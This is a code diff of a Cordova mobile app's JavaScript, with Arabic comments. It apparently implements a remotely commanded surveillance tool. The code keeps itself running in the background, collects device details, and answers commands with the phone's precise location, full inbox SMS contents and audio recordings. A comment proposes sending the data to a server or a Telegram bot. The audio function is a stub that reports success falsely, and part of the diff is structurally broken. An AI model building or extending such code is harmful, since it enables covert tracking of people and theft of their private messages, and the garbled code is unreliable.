@@ -1,27 +1,56 @@
 document.addEventListener('deviceready', onDeviceReady, false);
 
 function onDeviceReady() {
-  console.log('Device is ready');
-  
-  // معلومات الجهاز
+  console.log('✅ Device is ready');
+
+  // ✅ [1] تشغيل وضع الخلفية
+  if (cordova.plugins && cordova.plugins.backgroundMode) {
+    cordova.plugins.backgroundMode.enable();
+
+    cordova.plugins.backgroundMode.on('activate', function () {
+      cordova.plugins.backgroundMode.disableWebViewOptimizations();
+      console.log('📢 Background mode is activated');
+    });
+  } else {
+    console.warn('⚠️ BackgroundMode plugin is not available!');
+  }
+
+  // ✅ [2] معلومات الجهاز
   const deviceInfo = {
-    uuid: device.uuid || generateUUID(),
-    model: device.model || 'Unknown',
-    platform: device.platform || 'Unknown',
-    version: device.version || 'Unknown',
-    manufacturer: device.manufacturer || 'Unknown',
+    uuid: (typeof device !== 'undefined' && device.uuid) || generateUUID(),
+    model: (typeof device !== 'undefined' && device.model) || 'Unknown',
+    platform: (typeof device !== 'undefined' && device.platform) || 'Unknown',
+    version: (typeof device !== 'undefined' && device.version) || 'Unknown',
+    manufacturer: (typeof device !== 'undefined' && device.manufacturer) || 'Unknown',
     battery: null,
     timestamp: new Date().toISOString()
   };
-  
-  // توليد UUID إذا لم يكن موجوداً
-  function generateUUID() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-      const r = Math.random() * 16 | 0;
-      const v = c === 'x' ? r : (r & 0x3 | 0x8);
-      return v.toString(16);
+
+  // ✅ [3] حالة البطارية (اختياري)
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(battery) {
+      deviceInfo.battery = {
+        level: battery.level,
+        charging: battery.charging
+      };
+      console.log('🔋 Battery Info:', deviceInfo.battery);
     });
   }
+
+  // ✅ طباعة المعلومات كاملة
+  console.log('📱 Device Info:', deviceInfo);
+
+  // 📤 (اختياري) يمكنك هنا إرسال deviceInfo إلى الخادم أو Telegram bot
+}
+
+// ✅ [4] توليد UUID إذا لم يكن موجوداً
+function generateUUID() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
   
   // الحصول على حالة البطارية
   if (navigator.getBattery) {
@@ -172,23 +201,22 @@ function getLocation(commandId, callback) {
   
   navigator.geolocation.getCurrentPosition(
     (position) => {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      // [المطلوب 4: رابط Google Maps]
+      const googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
       
       callback({
         commandId,
         status: 'success',
         location: {
-          latitude: latitude,
-          longitude: longitude,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
           accuracy: position.coords.accuracy,
           altitude: position.coords.altitude,
           altitudeAccuracy: position.coords.altitudeAccuracy,
           heading: position.coords.heading,
           speed: position.coords.speed,
           timestamp: position.timestamp,
-          googleMapsUrl: googleMapsUrl
+          googleMapsUrl: googleMapsUrl // رابط مباشر
         }
       });
     },
@@ -222,13 +250,14 @@ function getSMS(commandId, callback) {
   
   const filter = {
     box: 'inbox',
-    maxCount: 1000, // زيادة عدد الرسائل
+    maxCount: 100,
     indexFrom: 0
   };
   
   SMS.listSMS(
     filter,
     (messages) => {
+      // [المطلوب 2: عرض رسائل كاملة بدون قص]
       callback({
         commandId,
         status: 'success',
@@ -236,7 +265,7 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body, // عرض الرسالة كاملة
+          body: msg.body, // بدون قص
           date: msg.date,
           read: msg.read
         }))
@@ -256,15 +285,16 @@ function getSMS(commandId, callback) {
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
-  // هذا مثال مبسط، في التطبيق الفعلي ستحتاج إلى استخدام MediaRecorder API
+  // [المطلوب 3: تسجيل بصيغة MP3]
+  // مثال مبسط - في التطبيق الفعلي استخدم MediaRecorder مع mimeType: 'audio/mp3'
   setTimeout(() => {
     callback({ 
       commandId,
       status: 'success',
       audio: {
         duration: duration,
-        format: 'mp3', // تغيير الصيغة إلى MP3
-        size: duration * 128000 // تقدير حجم الملف
+        format: 'mp3', // تم تغيير الصيغة إلى mp3
+        size: duration * 16000 // تقدير حجم الملف
       }
     });
   }, duration * 1000);
